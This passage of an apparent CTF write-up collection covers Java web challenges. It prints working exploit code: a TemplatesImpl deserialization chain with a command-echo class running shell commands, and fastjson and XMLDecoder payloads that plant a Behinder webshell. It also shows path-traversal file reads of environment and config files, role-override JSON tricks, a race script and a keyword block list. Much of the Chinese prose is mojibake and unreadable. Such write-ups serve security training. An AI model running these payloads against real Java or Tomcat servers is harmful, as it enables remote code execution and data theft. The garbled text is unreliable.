Thread.currentThread().getContextClassLoader().loadClass(\"javax.servlet.http.HttpServletRequest\").getDeclaredMethod(\"getHeader\",String.class); // getHeader.setAccessible(true); getWriter.setAccessible(true); Object writer = getWriter.invoke(resp); // String cmd = (String)getHeader.invoke(req, \"cmd\"); String[] commands = new String[3]; String charsetName = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? \"GBK\" : \"UTF-8\"; if (System.getProperty(\"os.name\").toUpperCase().contains(\"WIN\")) { commands[0] = \"cmd\"; commands[1] = \"/c\"; } else { commands[0] = \"/bin/sh\"; commands[1] = \"-c\"; } // commands[2] = cmd; commands[2] = \"cat /flag\"; writer.getClass().getDeclaredMethod(\"println\", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(), charsetName).useDelimiter(\"\\\\A\").next()); writer.getClass().getDeclaredMethod(\"flush\").invoke(writer); writer.getClass().getDeclaredMethod(\"close\").invoke(writer); } catch (Exception e){ e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } POC package com.lyzy.ctf.ezjaba.exp; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URLEncoder; import java.util.HashMap; import com.sun.syndication.feed.impl.EqualsBean; import com.sun.syndication.feed.impl.ObjectBean; import com.sun.syndication.feed.impl.ToStringBean; import javassist.ClassPool; import org.apache.tomcat.util.codec.binary.Base64; import javax.xml.transform.Templates; public class POC { public static void main(String[] args) throws Exception{ TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{ ClassPool.getDefault().get(SpringEcho.class.getName()).toBytecode() }); setFieldValue(templates, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class, templates); EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean); ObjectBean objectBean = new ObjectBean(String.class,\"ricky\"); // HashMap evilMap = new HashMap(); // evilMap.put(objectBean,1); // evilMap.put(objectBean,1); // setFieldValue(objectBean,\"_equalsBean\",equalsBean); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(toStringBean); oos.close(); System.out.println(URLEncoder.encode(Base64.encodeBase64String(barr.toByteArray()))); // ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); // Object o = (Object)ois.readObject(); // o.toString(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } [å®‰æ´µæ¯2021]ezjson ä»»æ„æ–‡ä»¶ä¸‹è½½ file=/proc/self/fd/5 è·å¾—æºç  æœ‰ä¸€ä¸ªfastjsonååºåˆ—åŒ–å…¥å£ @ResponseBody @RequestMapping({\"/json\"}) public String hello(HttpServletRequest request, HttpServletResponse response) { String Poc = request.getParameter(\"Poc\"); if (Poc != null) { String pattern = \".*Exec.*|.*cmd.*\"; / boolean isMatch = Pattern.matches(pattern, Poc); if (isMatch) { return \"No way!!!\"; } else { JSON.parse(Poc); return Poc; } } else { return \"readme\"; } } fastjsonç‰ˆæœ¬ä¸º1.2.47,éœ€è¦æˆ‘ä»¬ç»•è¿‡autoType,ç„¶åå»è§¦å‘æˆ‘ä»¬çš„App.Exec#getFlag(), fastjsonæœ‰ä¸ªç‰¹æ€§ï¼Œé‡åˆ°\\xå’Œ\\uå°±ä¼šè§£ç ï¼Œæ‰€ä»¥æ­£åˆ™ç”¨åå…­è¿›åˆ¶ç¼–ç ç»•è¿‡ public String getFlag() throws Exception { Exec defineclass = new Exec(this.getClass().getClassLoader()); Class clazz = defineclass.defineClass((String)null, this.ClassByte, 0, this.ClassByte.length); Method exec = clazz.getMethod(\"Exec\", String.class); Object Obj = clazz.newInstance(); exec.invoke(Obj, this.cmd); return this.flag; } å› ä¸ºç”¨çš„æ˜¯parseæ¥è¿›è¡Œååºåˆ—åŒ–,å¯ä»¥ç”¨$refè°ƒç”¨ä»»æ„çš„getter, ä¹Ÿå¯ä»¥é€šè¿‡su18å¸ˆå‚…çš„æ–¹æ³• é¢˜ç›®æ²¡æœ‰å‡ºç½‘, æ„é€ å‘½ä»¤å›æ˜¾(ä¹Ÿå¯ä»¥å†™æ–‡ä»¶, ç„¶åé€šè¿‡æœ€å¼€å§‹çš„æ–‡ä»¶ä¸‹è½½è·å–flag) import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.connector.Response; import org.apache.catalina.connector.ResponseFacade; import org.apache.catalina.core.ApplicationFilterChain; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import java.io.IOException; import java.io.InputStream; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.lang.reflect.Modifier; import java.util.Scanner; public class SpringEcho { public static void Exec(String cmd) { try { Class c = Thread.currentThread().getContextClassLoader().loadClass(\"org.springframework.web.context.request.RequestContextHolder\"); Method m = c.getMethod(\"getRequestAttributes\"); Object o = m.invoke(null); c = Thread.currentThread().getContextClassLoader().loadClass(\"org.springframework.web.context.request.ServletRequestAttributes\"); m = c.getMethod(\"getResponse\"); Method m1 = c.getMethod(\"getRequest\"); Object resp = m.invoke(o); Object req = m1.invoke(o); // HttpServletRequest Method getWriter = Thread.currentThread().getContextClassLoader().loadClass(\"javax.servlet.ServletResponse\").getDeclaredMethod(\"getWriter\"); Method getHeader = Thread.currentThread().getContextClassLoader().loadClass(\"javax.servlet.http.HttpServletRequest\").getDeclaredMethod(\"getHeader\", String.class); getHeader.setAccessible(true); getWriter.setAccessible(true); Object writer = getWriter.invoke(resp); String[] commands = new String[3]; String charsetName = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? \"GBK\" : \"UTF-8\"; if (System.getProperty(\"os.name\").toUpperCase().contains(\"WIN\")) { commands[0] = \"cmd\"; commands[1] = \"/c\"; } else { commands[0] = \"/bin/sh\"; commands[1] = \"-c\"; } commands[2] = cmd; writer.getClass().getDeclaredMethod(\"println\", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(), charsetName).useDelimiter(\"\\\\A\").next()); writer.getClass().getDeclaredMethod(\"flush\").invoke(writer); writer.getClass().getDeclaredMethod(\"close\").invoke(writer); } catch (Exception e){ } } } POC import java.util.Locale; import javassist.ClassPool; public class exp { public static String bytesToHexString(byte[] src){ StringBuilder stringBuilder = new StringBuilder(\"\"); if (src == null || src.length [GKCTF 2021]babycat-revenge è®¿é—®æ˜¯ä¸€ä¸ªç»“åˆç™»å½•å’Œæ³¨å†Œçš„ç½‘é¡µ, ä½†æ˜¯æ³¨å†ŒåŠŸèƒ½å› å‰ç«¯é™åˆ¶ä¸è®©ç›´æ¥ä½¿ç”¨, æŠ“åŒ…å¯ä»¥çœ‹åˆ°ä»£ç é€»è¾‘ // var obj={}; // obj[\"username\"]='test'; // obj[\"password\"]='test'; // obj[\"role\"]='guest'; function doRegister(obj){ if(obj.username==null || obj.password==null){ alert(\"ç”¨æˆ·åæˆ–å¯†ç ä¸èƒ½ä¸ºç©º\"); }else{ var d = new Object(); d.username=obj.username; d.password=obj.password; d.role=\"guest\"; $.ajax({ url:\"/register\", type:\"post\", contentType: \"application/x-www-form-urlencoded; charset=utf-8\", data: \"data=\"+JSON.stringify(d), dataType: \"json\", success:function(data){ alert(data) } }); } } å¯ä»¥é€šè¿‡postä¼ å‚è¿›è¡Œæ³¨å†Œ, æ ¹æ®ajaxæ¨¡æ‹Ÿ data={\"username\":\"test\",\"password\":\"test\",\"role\":\"guest\"} æ™®é€šç”¨æˆ·åªèƒ½ä½¿ç”¨downloadåŠŸèƒ½, å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å– /home/download?file=../../../../../../../../proc/self/environ å¾—åˆ°å½“å‰è·¯å¾„å’Œtomcatè·¯å¾„, å¯ä»¥å¾—çŸ¥é™æ€æ–‡ä»¶è·¯å¾„/usr/local/tomcat/webapps/ROOT/static/ PWD=/home/app CATALINA_HOME=/usr/local/tomcat å»æŸ¥web.xml /home/download?file=../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml å¾—åˆ°æ•´ä¸ªæœåŠ¡çš„é…ç½® register com.web.servlet.registerServlet login com.web.servlet.loginServlet home com.web.servlet.homeServlet upload com.web.servlet.uploadServlet download com.web.servlet.downloadServlet logout com.web.servlet.logoutServlet logout /logout download /home/download register /register java login /login home /home upload /home/upload loginFilter com.web.filter.LoginFilter loginFilter /home/* java /WEB-INF/index.jsp å°±å¯ä»¥è·å–å…¶ä¸­çš„classäº†, ä¸€å…±6ä¸ªåŠŸèƒ½1ä¸ªè¿‡æ»¤å™¨ # å…¶å®ƒçš„ç±»ä¼¼ /home/download?file=../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/web/servlet/registerServlet.class åç¼–è¯‘æŸ¥é˜…ä»£ç , è¿˜å¯ä»¥ä¸‹è½½å¾—åˆ°DAOæ–‡ä»¶ import com.web.dao.Person; import com.web.dao.baseDao; æŸ¥é˜…ä¸Šä¼ ä»£ç å‘ç°é™åˆ¶åç¼€ä½†ä¸é™åˆ¶æ–‡ä»¶è·¯å¾„, ä¹Ÿå°±æ˜¯å¯ä»¥ä¸Šä¼ åˆ°æˆ‘ä»¬éœ€è¦çš„ä½ç½®, é™¤æ­¤ä¹‹å¤–è¿˜æœ‰å¯¹æ–‡ä»¶å†…å®¹çš„ç®€å•è¿‡æ»¤ String[] blackList = { \"Runtime\", \"exec\", \"ProcessBuilder\", \"jdbc\", \"autoCommit\" }; çœ‹åˆ°æ³¨å†Œå™¨åˆ™æ˜¯ä¸€ä¸ªæ­£åˆ™åŒ¹é…æ³¨å†Œ, æˆ‘ä»¬éœ€è¦\"role\":\"admin\" if (!StringUtils.isNullOrEmpty(role)) { var = var.replace(role, \"\\\"role\\\":\\\"guest\\\"\"); person = (Person)gson.fromJson(var, Person.class); } else { person = (Person)gson.fromJson(var, Person.class); person.setRole(\"guest\"); } åšçš„æ˜¯jsonè§£æ, æ‰€ä»¥å¯ä»¥é€šè¿‡JSONè§£æunicodeæˆ–è€…æ³¨é‡Šç»•è¿‡å» data={\"username\":\"1\",\"password\":\"1\",\"role\":\"guest\",\"\\u0072\\u006F\\u006C\\u0065\":\"admin\"} JSONè§£æåä¼šå¯¹é‡å¤çš„å€¼è¿›è¡Œè¦†ç›–, ä¹Ÿå°±æ˜¯\"\\u0072\\u006F\\u006C\\u0065\":\"admin\"è§£æä¸º\"role\":\"admin\"åè¦†ç›–äº†å‰é¢çš„\"role\":\"guest\" æˆ–è€…é€šè¿‡æ³¨é‡Šç»•è¿‡åŒ¹é…, å› ä¸º\"role\":/**/\"admin\"ä¸ä¼šå½±å“è§£æåçš„èµ‹å€¼ data={\"username\":\"2\",\"password\":\"2\",\"role\":\"guest\",\"role\":/**/\"admin\"} å¾—åˆ°adminæƒé™åé€šè¿‡baseDaoå‘ç°ç™»å½•å¤„è°ƒç”¨å…¶getConnectionæ–¹æ³• connection = baseDao.getConnection(); è·Ÿè¿›å‘ç°è°ƒç”¨å…¶getConfigæ–¹æ³• public static void getConfig() throws FileNotFoundException { Object obj = (new XMLDecoder(new FileInputStream(System.getenv(\"CATALINA_HOME\") + \"/webapps/ROOT/WEB-INF/db/db.xml\"))).readObject(); if (obj instanceof HashMap) { HashMap map = (HashMap)obj; if (map != null && map.get(\"url\") != null) { driver = (String)map.get(\"driver\"); url = (String)map.get(\"url\"); username = (String)map.get(\"username\"); password = (String)map.get(\"password\"); } } } ç„¶ågetConfigä¼šå¯¹å…¶xmlæ–‡ä»¶è¿›è¡Œååºåˆ—åŒ–, è€ƒå¯Ÿçš„æ˜¯XMLDecoderååºåˆ—åŒ–, ä½¿ç”¨ weblogic XMLDecoder payload å»ç»•è¿‡(å†°èé©¬, è¿æ¥å¯†ç rebeyond) /usr/local/tomcat/webapps/ROOT/static/ricky.jsp ]]> XMLDecoderç›¸å½“äºæ‰§è¡Œ java.io.PrintWriter x = new java.io.PrintWriter(\"/usr/local/tomcat/webapps/ROOT/static/ricky.jsp\"); x.println(\"...\"); x.close(); ä¸Šä¼ è·¯å¾„ ../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/db/db.xml ç„¶åå†æ¬¡ç™»å½•å³å¯è§¦å‘, æ‰§è¡Œ/readflagå³å¯ ç™»é™†ä¸äº†_Revenge éªŒè¯ç å¤„æœ‰ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ /v/c?r=YzgxZTcyOC5qcGc= çœ‹è¿›ç¨‹, å¾—çŸ¥tomcatä½ç½® /v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vcHJvYy9zZWxmL2NtZGxpbmU= file=/home/apache-tomcat-8.5.45/conf/logging.properties ç„¶åå°±æ˜¯å»æŸ¥é˜…ROOTæ ¹ç›®å½•, web.xmlå’Œpom.xml /v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi93ZWIueG1s /v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi9wb20ueG1s ç„¶åæ ¹æ®pom.xmlå»è·å–æ¡†æ¶ ctfshow tiny-framework system 1.1 ${basedir}\\lib\\tiny-framework-1.0.1.jar å»ä¸‹è½½ tiny-framework-1.0.1.jar /v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi9saWIvdGlueS1mcmFtZXdvcmstMS4wLjEuamFy ç”¨winrarè‡ªå¸¦çš„ä¿®å¤åŠŸèƒ½ä¿®å¤åå³å¯åç¼–è¯‘æŸ¥é˜…æºç , åˆ†æåç»§ç»­è·å–classæ–‡ä»¶ /v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi9jb25maWcvY29udHJvbGxlci5wcm9wZXJ0aWVz s=com.ctfshow.controller.Index errorController=com.ctfshow.controller.ErrorPage index=com.ctfshow.controller.Index v=com.ctfshow.controller.Validate /v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi9jbGFzc2VzL2NvbS9jdGZzaG93L2NvbnRyb2xsZXIvSW5kZXguY2xhc3M= /v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi9jbGFzc2VzL2NvbS9jdGZzaG93L2NvbnRyb2xsZXIvVmFsaWRhdGUuY2xhc3M= å‘ç°æ³¨å†Œå¤„å¯ä»¥ä¸Šä¼ æ–‡ä»¶, å†™é©¬å¯ä»¥å†™åœ¨WEB-INFä¸‹, ç„¶åè¦†å†™web.xmlè§¦å‘tomcatçƒ­éƒ¨ç½²getshell ç„¶åå†™åœ¨ ../../../../../../../home/apache-tomcat-8.5.45/webapps/ROOT/WEB-INF/shell.jsp, è¦†å†™web.xml shell /WEB-INF/shell.jsp shell /ricky å¯¹è·¯å¾„çš„åŒ¹é…ä¹Ÿéœ€è¦æ”¹ä¸€ä¸‹, ä¸èƒ½ç›´æ¥åŒ¹é…æˆ‘ä»¬çš„è·¯å¾„å¦åˆ™ä¼šç›´æ¥è¿”å›404 routerFilter /404.html /s/* REQUEST ä¾æ¬¡å†™å…¥åç­‰å¾…äº›è®¸è®¿é—® /ricky å³å¯getshell, æ ¹ç›®å½• cat /ctfshowflag å³å¯ [VNCTF2022]easyJ4va é¦–å…ˆæ˜¯ä»»æ„æ–‡ä»¶è¯»å–, æ ¹æ®ç¯å¢ƒå˜é‡ç¡®å®štomcatå…·ä½“ç›®å½•ç„¶åæœç´¢ file:///proc/self/environ file:///usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml file:///usr/local/tomcat/logs/localhost.2022-02-12.log file:///usr/local/tomcat/logs/localhost_access_log.2022-02-12.txt é€šè¿‡æ—¥å¿—æˆåŠŸæ‰¾åˆ°æ¶æ„è·¯ç”±ä»¥åŠå»¶ä¼¸ file:///usr/local/tomcat/webapps/ROOT/WEB-INF/classes/servlet/HelloWorldServlet.class GETéƒ¨åˆ†å¯ä»¥å°è¯•å¤šçº¿ç¨‹çˆ†ç ´è·å–, éœ€è¦ä¸¤ä¸ªä¸åŒçš„name(ä¸€ä¸ªéšä¾¿å†™, å¦ä¸€ä¸ªä¸ºvnctf2022), æ¯”èµ›æ—¶é ç€æ—¥å¿—è¯»å–åˆ°å…¶ä»–äººçˆ†ç ´çš„key protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { String reqName = req.getParameter(\"name\"); if (reqName != null) { this.name = reqName; } if (Secr3t.check(this.name)) { this.Response(resp, \"no vnctf2022!\"); } else { if (Secr3t.check(this.name)) { this.Response(resp, \"The Key is \" + Secr3t.getKey()); } } } åç»­å°è¯•å‘ç°å¯è¡Œ, åˆ©ç”¨æ­¤ç«äº‰è„šæœ¬, è€ƒå¯Ÿ servlet çš„çº¿ç¨‹å®‰å…¨é—®é¢˜ å‚è€ƒ: https://y4tacker.github.io/2022/02/03/year/2022/2/Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ # -*-coding:utf-8-*- import requests import threading import time url = \"http://432a4451-aa66-4ccd-a1a0-da92bf9c8192.node4.buuoj.cn:81/evi1?name={}\" def ricky(): res = requests.get(url=url.format(\"ricky\")) if \"The Key is\" in res.text: print(res.text) else: print(res.text) def vnctf2022(): res = requests.get(url=url.format(\"vnctf2022\")) if \"The Key is\" in res.text: print(res.text) else: print(res.text) if __name__ == '__main__': event = threading.Event() while True: threading.Thread(target=ricky, args=()).start() threading.Thread(target=vnctf2022, args=()).start() time.sleep(0.5) event.set() POSTéƒ¨åˆ†æ˜¯ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ– protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { String key = req.getParameter(\"key\"); String text = req.getParameter(\"base64\"); if (Secr3t.getKey().equals(key) && text != null) { Decoder decoder = Base64.getDecoder(); byte[] textByte = decoder.decode(text); User u = (User)SerAndDe.deserialize(textByte); if (this.user.equals(u)) { this.Response(resp, \"Deserializeâ€¦â€¦ Flag is \" + Secr3t.getFlag().toString()); } } else { this.Response(resp, \"KeyError\"); } } ç”±äº transient ä¸èƒ½ç›´æ¥è¢« readObject æˆ– writeObject æ–¹æ³•åºåˆ—åŒ–, éœ€è¦å•ç‹¬åˆ†å¼€èµ‹å€¼ å‚è€ƒ: https://stackoverflow.com/questions/17235877/need-of-defaultreadobject-and-defaultwriteobject https://www.coder.work/article/2812174 æ ¹æ®é¢˜æ„æ”¥å†™åºåˆ—åŒ–, å•ç‹¬æå– height å€¼å¹¶èµ‹å€¼è€Œä¸æ˜¯å°† height åºåˆ—åŒ– private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException { s.defaultReadObject(); this.height = (String)s.readObject(); } private void writeObject(ObjectOutputStream s) throws IOException { s.defaultWriteObject(); s.writeObject(\"180\"); } æœ€ç»ˆpayload evi1?base64=rO0ABXNyAAtlbnRpdHkuVXNlcm1aqowD0DcIAwACTAADYWdldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEbmFtZXEAfgABeHB0AAM2NjZ0AAttNG5fcTF1XzY2NnQAAzE4MHg=&key=YYixtWPfKHsBvjELiwa90ZmFhuMcskBZ [iæ˜¥ç§‹2021ä¼ è¯´æ®¿å ‚]easy java URLDNSæ¢æµ‹gadgetå‚è€ƒ: https://bishopfox.com/blog/gadgetprobe GadgetProbeä¸‹è½½: https://github.com/BishopFox/GadgetProbe/releases/tag/v1.0 ä¸»è¦çœ‹Flagç±» public Flag getFlagInstance(Flag flagTemplate) throws Exception { if (create){ // flagå¼€å¤´çš„å€¼å¯¹äº†å°±ä¼šè¿”å›Flagå¯¹è±¡, å¦åˆ™ç»ˆæ­¢æœ¬æ¬¡è¿è¡Œ if (!flagInstance.flag.startsWith(flagTemplate.flag)){ throw new Exception(\"flag not valid\"); } else { return flagTemplate; } } else { return flagInstance; } } private Object readResolve() throws Exception{ // ååºåˆ—åŒ–é¦–å…ˆè§¦å‘é‡å†™çš„ readResolve return getFlagInstance(this); } å‚è€ƒ GadgetProbe å¯ä»¥å¾—çŸ¥æ˜¯é‡‡ç”¨ LinkedHashMap ç»“åˆ URLDNS è§¦å‘çš„æ¢æµ‹gadget, å½“flagå¼€å¤´çš„å€¼è¾“å…¥æ­£ç¡®æ—¶è¿”å›å¯¹è±¡è‡´ä½¿æ•´ä¸ªç¨‹åºæ­£å¸¸è¿è¡Œ, é¡ºåˆ©è§¦å‘DNS, åæ­£ä¼šå› Exceptionæå‰ä¸­æ–­ååºåˆ—åŒ–, æ— æ³•è§¦å‘DNS, å‚è€ƒæ”¥å†™EXPå³å¯ package exploit; import com.web.simplejava.model.Flag; import org.springframework.http.HttpEntity; import org.springframework.http.ResponseEntity; import org.springframework.web.client.RestTemplate; import java.lang.reflect.Field; import java.net.URI; import java.net.URL; import java.util.LinkedHashMap; public class exp { public static void doGETParam(Object obj) throws Exception{ URI url = new URI(\"http://localhost:8080/flag\"); HttpEntity requestEntity = new HttpEntity<>(Serializables.serialize(obj)); RestTemplate restTemplate = new RestTemplate(); ResponseEntity res = restTemplate.postForEntity(url, requestEntity, String.class); System.out.println(res.getStatusCodeValue()); System.out.println(res.getBody()); } public static void main(String[] args) throws Exception { String dic = \"abcdefghijklmnopqrstuvwxyz0123456789-\"; for (int i = 0;i æ ¹æ®DNS logæŸ¥çœ‹åˆ¤æ–­å‡ºçš„å­—æ¯, ä¸€æ¬¡ä¸€ä½, é™¤éå†™å…¥æ ¡éªŒDNSè§¦å‘çš„å‡½æ•°(å®ç°éš¾åº¦è¾ƒå¤§ä¸”å®¹é”™ç‡å°) ... "}}